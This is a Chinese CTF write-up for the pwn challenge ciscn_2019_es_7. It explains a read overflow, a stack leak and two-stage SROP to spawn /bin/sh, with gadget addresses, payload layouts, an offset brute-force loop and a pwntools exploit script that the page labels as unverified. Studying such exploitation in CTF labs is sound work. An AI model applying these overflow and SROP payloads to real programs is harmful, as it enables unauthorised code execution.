---
tags:
  - pwn
  - writeup
  - SROP
  - sigreturn
  - ciscn_2019
  - stack-leak
created: 2026-07-21
updated: 2026-10-24
status: 历史候选 EXP 语法通过；附件、栈布局与动态利用尚未复核
---

# ciscn_2019_es_7 Writeup — 栈泄露 + SROP 弹 Shell

> 64-bit ELF 的历史分析路线：`read` 溢出 → 尝试用 `write` 输出栈数据 → 设置 `rax=15` 触发 sigreturn → SROP 执行 `execve("/bin/sh")`。本页还没有附件/GDB 证据确认泄露字段和各个栈槽；地址与偏移必须在**同一进程实例**中重新确认，不能把候选枚举范围当作通法。
>
> **相关笔记：** `syscall是什么` · `Linux信号与signal frame` · `SROP` · `rootersctf_2019_srop_wp`（SROP 入门）· `PWN输入输出与协议同步` · `Exploit脚本模板库` · `WP索引与复盘入口`

> [!warning] 栈布局待核验
> 本页旧版的栈图把 `old_rbp`、返回地址和 `buf+0x10` 的含义写成了互相矛盾的说法；本轮没有题目附件和 GDB 现场，不能替它们选定一个“正确偏移”。以下涉及 `data[0x20:0x28]`、`leak - off` 和 Stage 1/2 栈槽的内容均是**候选分析**，必须先按目标反汇编、`ret` 前 `$rsp` 与真实输出重新验证，不能把当前 EXP 当成已跑通。

## 一、题目概况

| 项目 | 说明 |
|------|------|
| 文件画像（历史记录，待附件核对） | `ciscn_2019_es_7`；记录为 64-bit ELF、动态链接、未剥离符号 |
| 保护（历史记录，待附件核对） | NX 开启、无 Canary、无 PIE |
| 漏洞假设 | 历史记录称 `read(0, buf, 0x400)` 写入 16 字节局部缓冲区；具体函数、地址和长度待反汇编确认 |
| 资源假设 | 历史分析记录了 `rax=15` gadget、`syscall` 位置和一次栈数据输出；均待附件/GDB 核实 |
| 目标 | 若题目与历史记录一致，目标为 `execve("/bin/sh")`；仅是分析目标，不代表 EXP 已成功 |

## 二、逆向分析

### 2.1 main — 只做一件事

```c
int main() {
    vuln();    // 调一次就结束
}
```

### 2.2 vuln — 历史记录中的漏洞假设

```c
void vuln() {                    // 伪代码；具体寻址以附件反汇编为准
    char buf[16];

    // ① read — 溢出漏洞
    read(0, buf, 0x400);        // ★ buf 只有 16 字节，读 1024 字节！

    // ② write — 栈泄露
    write(1, buf, 0x30);        // 请求写最多 48 字节；实际返回长度需由运行/GDB确认

    return;
    // ★ 返回地址被我们覆盖了
}
```

**待核验的关键设计**：公开题解把 `read` 和 `write` 描述为使用同一个 buffer 地址。必须从目标汇编确认两个调用的缓冲区地址一致；溢出的原始输出中有地址，也不自动意味着它是可用的栈指针。

### 2.3 历史记录中的 gadget 地址（待附件确认）

旧笔记记录了一个名为 `gadgets` 的函数及以下反汇编。由于本轮没有目标附件，地址、指令边界和是否能从溢出路径到达都尚未核实：

```asm
gadgets:
    4004d6: push   rbp             ; 函数头
    4004d7: mov    rbp, rsp
    4004da: mov    rax, 0xf       ; ★ rax = 15  (rt_sigreturn)
    4004e1: ret
    4004e2: mov    rax, 0x3b      ; ★ rax = 59  (execve)
    4004e9: ret
    4004eb: pop    rbp             ; 跳过 rbp
    4004ec: ret
```

旧笔记还记录了 `vuln` 附近的指令：
```asm
    4004f1: xor    rax, rax       ; rax = 0；后续是否设置齐 read 参数待反汇编确认
    ...
    400517: syscall                ; ★ 执行系统调用
    400519: ret
```

**历史记录中的三个候选地址**：

| 地址 | 作用 |
|------|------|
| `0x4004DA` | `mov rax, 0xf; ret` → 设 rax=15 准备 sigreturn |
| `0x4004F1` | 历史记录假设从此处到 `syscall` 会完成 `read(0, buf, 0x400)`；必须检查 syscall 前的 `rdi/rsi/rdx`，不能仅凭 `xor rax,rax` 认定参数正确 |
| `0x400517` | `syscall` → 触发当前 rax 对应的系统调用 |

### 2.4 栈布局：先按机器现场确认

不能只凭 `char buf[16]` 就断言缓冲区、saved RBP、返回地址之间的距离。编译器是否保存 RBP、函数尾声是否执行 `leave`、以及 `read/write` 取地址时使用哪个基准，都会改变槽位。

先在附件中检查 `vuln` 的函数序言、`read`/`write` 的缓冲区地址计算和函数尾声；再在 `ret` 前查看 `$rsp`。两种常见情况如下，**只是比较模型，不代表本题已经确认是哪一种**：

```text
模型 A：无 saved RBP，ret 前 [rsp] 正好是 buf+0x10
低地址  buf[0..15]  |  ret 槽（buf+0x10） | 更高地址
        16 字节     |  ret 直接弹此 qword

模型 B：传统 leave; ret，缓冲区在 rbp-0x10
低地址  buf[0..15] | saved RBP | ret 槽（buf+0x18） | 更高地址
```

如果附件不在手边，暂时把下面脚本的偏移、泄露字段和 payload 槽位都当作未证实假设；不要用图把缺失的 GDB 证据“补出来”。

## 三、漏洞原理

### 3.1 栈泄露

`write(1, buf, 0x30)` 请求从 `buf` 最多写出 48 字节。只有当目标本次实际返回并写出 0x30 字节、且原始输出中该位置确实是栈指针时，才能按固定 48 字节解析；系统调用的长度参数本身不能证明这两件事。

历史脚本向第一阶段发送 24 字节；目标这次 `read` 实际读到多少、`buf` 是否正是 `write` 的起点，都要用 GDB/原始输出确认。下面只是“完整收到了 0x30 字节，且发送内容从输出起点开始”时的字节位置示意，不代表这些内存槽已经被证实：
```
data[0x00:0x08] = "/bin/sh\0"   （假设 Stage 1 输入从 write 的 buf 起点开始）
data[0x08:0x10] = "A" * 8
data[0x10:0x18] = 候选 gadget 字节（须确认输入位置及实际写入）
data[0x18:0x30] = 其余原始输出；字段含义未知，不能预先标成 saved RBP / argv

data[0x20:0x28] = 历史脚本的候选 leak 切片；须检查原始 bytes 并在 GDB 验证指向
```

### 3.2 两阶段 SROP

历史记录称反汇编/符号表中未见可直接复用的 `system` 或 `execve@plt` 路径；由于本轮没有附件，这一点也尚未复核。若目标确实缺少常规调用资源且 SROP 的触发条件满足，才考虑 SROP；这不是“动态链接程序都必须 SROP”的结论。

**思路**：

```
历史路线假设第一轮 `vuln` 可以完成：
  ① read 读入 "/bin/sh" + padding + 候选返回地址 0x4004F1
  ② write 请求输出最多 48 字节；是否包含可用栈指针待验证
  ③ 若 ret 槽确实被控制，跳到候选地址 0x4004F1；只有该处到 syscall 之间重新设置了正确的 rdi/rsi/rdx，才是有效的 read stager
  ④ 若该路径确实再次进入 `read` → 尝试发送第二阶段的 SROP payload

第二轮（仅当 0x4004F1 经反汇编确认会以正确参数重新进入 read 时）：
  ⑤ 读入 sigframe payload
  ⑥ ret → 0x4004DA (mov rax,0xf) → rax=15
  ⑦ ret → 0x400517 (syscall) → rt_sigreturn！
  ⑧ 内核恢复 sigframe 里我们设的寄存器
  ⑨ rax=59, rdi="/bin/sh"地址 → execve → 🎉 shell
```

### 3.3 地址关系先验证，枚举只是最后手段

> [!note] **两种放置 `/bin/sh` 的候选方案**
> 无 PIE 时主程序的静态 `.data/.bss` 地址通常可预测；栈仍受 ASLR 影响。rootersctf 的 WP 使用固定可写段；本题历史路线尝试栈泄露后推导字符串位置，但本地附件与 GDB 现场尚未核验。不要预设“本题必须放栈上”或“枚举 9 个一定命中”。

若泄露指针的语义或字符串位置无法在当前实例精确确定，才可在题目允许的前提下做受限枚举；每一次尝试都应重新完成该实例的泄露，不要假定跨进程的绝对栈地址有效：

```text
for off in [0x110, 0x118, 0x120, 0x128, 0x130, 0x138, 0x140, 0x148, 0x150]:
    # 尝试 off，发 "id"，看有没有返回 "uid="
```

## 四、完整的 Payload 流程

### Stage 1 Payload（候选槽位，待现场确认）

```
发送: "/bin/sh\x00" + "A"*8 + p64(0x4004F1)

若 `ret` 前的 `$rsp` 使 offset `0x10` 对应返回地址，候选布局如下；若实际槽位不同，payload 必须重算：
┌──────────┬──────────┬──────────┬──────────────┐
│"/bin/sh\0"│ "A"*8    │ 0x4004F1（候选 ret 槽）│
│ (8 B)    │ (8 B)    │ 仅当 ret 前 [rsp]=buf+0x10│
└──────────┴──────────┴──────────────────────────┘
 buf        buf+8      buf+0x10（候选；需现场确认）
```

执行后：
- `write(1, buf, 0x30)` → 请求写最多 48 字节；若本次实际写出 48 字节，接收侧才能按 0x30 收齐并检查候选字段，字段是否为栈指针仍要另行证明
- `ret` → 若槽位正确则尝试跳到 `0x4004F1`；只有后续指令设置了正确的 read 参数，才会等待 Stage 2

### Stage 2 Payload（候选槽位，待现场确认）

```
发送: "/bin/sh\x00" + "B"*8 + p64(0x4004DA) + p64(0x400517) + sigframe

栈上的布局:
┌──────────┬──────────┬──────────┬──────────┬──────────────────┐
│"/bin/sh\0"│ padding  │ 0x4004DA │ 0x400517 │ sigframe (execve)│
│          │          │ mov rax  │ syscall! │ rax=59 rdi=候选地址│
│          │          │  ,0xf    │          │ rip=0x400517     │
└──────────┴──────────┴──────────┴──────────┴──────────────────┘
候选数据区；栈槽相对位置需由第二阶段 read 返回后的现场确认
```

执行链：
```
ret → 0x4004DA → mov rax, 0xf → ret
    → 0x400517 → syscall (sys_rt_sigreturn)
    → 内核读 sigframe:
        rax = 59 (execve)
        rdi = leak - off  ("/bin/sh" 的地址)
        rsi = 0
        rdx = 0
        rip = 0x400517 → syscall → execve!
```

## 五、历史 EXP 候选（逐行讲解；未动态复现）

```python
from pwn import *
import os

context(os='linux', arch='amd64', log_level='info')

pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ciscn_2019_es_7")
MOV_RAX_15 = 0x4004DA   # 候选：mov rax, 0xf; ret，地址待附件确认
XOR_RAX    = 0x4004F1   # 候选 read-stager，参数寄存器待反汇编/GDB确认
SYSCALL    = 0x400517   # 候选 syscall 地址，待附件确认
IO_TIMEOUT = 2

# 一次只测一个候选偏移；每次运行都重新取得本进程的 leak。
# 0x148 只是历史候选值，不代表已经确认。
off = int(args.OFF or "0x148", 0)

# 如目标需要配套运行时，必须同时提供匹配 loader 与库目录。
# 不提供时会使用当前主机默认运行环境，不能据此声称匹配远程。
loader = args.LOADER
libdir = args.LIBDIR
if bool(loader) != bool(libdir):
    raise SystemExit("LOADER 与 LIBDIR 必须同时提供，或都不提供")
if loader:
    if not os.path.isfile(loader) or not os.path.isdir(libdir):
        raise SystemExit("LOADER 必须是文件，LIBDIR 必须是目录")
    p = process([loader, "--library-path", libdir, pwn])
else:
    log.warning("使用主机默认 loader/libc；请先确认这与目标运行环境兼容")
    p = process(pwn)

try:
    # Stage 1：候选溢出并收取泄露。ret 槽是否为 buf+0x10 尚待现场验证。
    p.send(b"/bin/sh\x00" + b"A" * 8 + p64(XOR_RAX))
    data = p.recvn(0x30, timeout=IO_TIMEOUT)
    if len(data) != 0x30:
        raise EOFError(f"未收到完整 0x30 字节候选泄露，实际收到 {len(data):#x} 字节")

    leak = u64(data[0x20:0x28])  # 字段位置/其是否为指针，必须由原始 bytes 与 GDB 确认
    binsh = leak - off
    log.info(f"候选 leak={leak:#x}, /bin/sh={binsh:#x}, OFF={off:#x}")

    # Stage 2：候选 SROP frame；所有寄存器值和 frame 在栈上的落点待 GDB 验证。
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = SYSCALL
    frame.rsp = leak  # 候选恢复栈地址；须验证映射、对齐和后续可读性
    stage2 = b"/bin/sh\x00" + b"B" * 8 + p64(MOV_RAX_15) + p64(SYSCALL) + bytes(frame)
    p.send(stage2)

    # 不紧接着 sendline("id")：同一 read 可能把命令和 frame 一并消费。
    # 若现场证明已进入 shell，在交互提示下手动输入 id；没有响应不自动判定成功。
    log.warning("Stage 2 已发送，但仍是未验证候选；仅在确认 shell 后手动输入 id")
    p.interactive()
finally:
    p.close()
```

此代码是**单一候选运行骨架**，不是已跑通 EXP。每次只用一个 `OFF=...` 启动，避免把不同进程的栈地址混在一起；需用题目附件核对三个代码地址、read/write 长度与槽位后再改。若收到 Stage 2 后立即再发 `id`，第二个输入可能和 SROP frame 一起被同一个 `read()` 消费，因此这里改为进入交互后手动验证。`LOADER`/`LIBDIR` 只控制本地启动环境，仍须在 GDB 或 `/proc/<pid>/maps` 中确认实际加载结果。

## 六、两个 SROP 题目的对比

| | rootersctf_2019_srop | ciscn_2019_es_7 |
|---|---|---|
| 链接方式 | 静态链接 | 动态链接（但不用 libc） |
| gadget | 只有一个 `syscall` | 自带 `mov rax,0xf` 和 `mov rax,0x3b` |
| 字符串地址 | 使用固定 `.data` 候选 `0x402000`（以题目附件验证）| 历史脚本尝试通过 write 输出推导；本题泄露字段未复核 |
| "/bin/sh"放哪 | 已验证的 `.data` 段 | 栈上或其他已验证可写位置；地址关系由泄露推导 |
| 暴力枚举 | 通常不需要 | 仅在无法精确推导关系且题目允许时考虑 |
| 触发 sigreturn | `pop rax; syscall` 设置 rax=15 | `mov rax,0xf; ret; syscall` |

## 七、SROP 通用步骤（两板斧）

```
┌─────────────────────────────────────────────────────────┐
│ Step 1: 把 "/bin/sh\0" 写到一个已知（或可推算）的地址     │
│ ├── 方案 A: 用 .data / .bss 段（无 PIE 时固定）          │
│ ├── 方案 B: 栈泄露 + 算偏移（有 ASLR 时）                 │
│ └── 方案 C: 先 SROP 调 read 搬到已知地址                  │
├─────────────────────────────────────────────────────────┤
│ Step 2: SROP 触发 execve                                 │
│ ├── 设 rax = 15（rt_sigreturn 号）                       │
│ ├── 执行 syscall                                         │
│ └── sigframe 里: rax=59, rdi="/bin/sh"地址, rsi=0, rdx=0 │
└─────────────────────────────────────────────────────────┘
```

> [!tip] 怎么判断用什么方案？
> - 无 PIE + 已验证可写段 → 可使用其静态地址；仍须确认写入与权限。
> - 地址浮动 → 优先泄露并推导同一进程的准确关系；枚举是最后手段。
> - 无可用字符串位置 → 可考虑先通过已验证的读写原语布置数据。

## 八、知识点总结

**识别 SROP 题**

纯 syscall 程序、常规 gadget 不全、又存在可控的 `rax=15` 与 `syscall`，是**优先检查 SROP**的信号；仍须验证溢出后 `$rsp` 能放下 frame、系统调用确为 x86-64 `rt_sigreturn`，以及所需地址/字符串是否可得。

**栈帧分析**

在目标 `ret` 前读取 `$rsp`、`$rbp` 和 `x/8gx $rsp`；再从反汇编确认 `buf` 的实际地址、序言是否保存 RBP、尾声是否执行 `leave`。把观察到的 qword 与原始输入逐字节比对，不预设后面的值一定是 argv、saved RBP 或返回地址。

**算偏移**

只有当 GDB/输出证据确认一个泄露值确实指向某个栈位置后，才用同一进程内的地址差计算它与 `"/bin/sh\0"` 的距离。不要从旧图或其他题解抄固定偏移。

**leave vs 无 leave**

`leave; ret` 时，`leave` 等价于 `mov rsp, rbp; pop rbp`，随后 `ret` 从新 `$rsp` 指向的位置取 RIP。若没有 `leave`，`ret` 只从**当前的 `[rsp]`**取 RIP；它不会自动跳过一个 qword。具体 offset 必须按目标的 prologue、epilogue 和 `ret` 前 `$rsp` 推导；本题没有附件现场可据以填写固定数字。

**SROP 三板斧**

第一步把 "/bin/sh" 放到已知地址（栈上泄露或 .bss 固定地址）。第二步设 rax=15（`mov rax,0xf; ret` 或利用 read 返回值）。第三步 syscall 触发 sigreturn，栈上的 SigreturnFrame 一次性设置全部寄存器，execve 弹 shell。

**调试 SROP**

断在 syscall 指令，`info reg rax` 确认是 0xf，然后 `si` 单步执行 syscall，再 `info reg all` 看所有寄存器瞬间变化——rax 从 0xf 变成 0x3b（59），rdi 指向 "/bin/sh"，rsi/rdx 归零。

**爆破 offset**

页对齐只约束映射基址，不能保证 argv、环境、启动器与输入造成的栈内相对布局跨实例保持在某个固定窗口。应在 GDB 里测量泄露指针和目标字符串的关系；若必须枚举，记录每次失败原因与服务端限制。

## 相关代码与实战模板

- 本页模板入口：`pwntools EXP 启动骨架` · `GDB 观察模板`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。
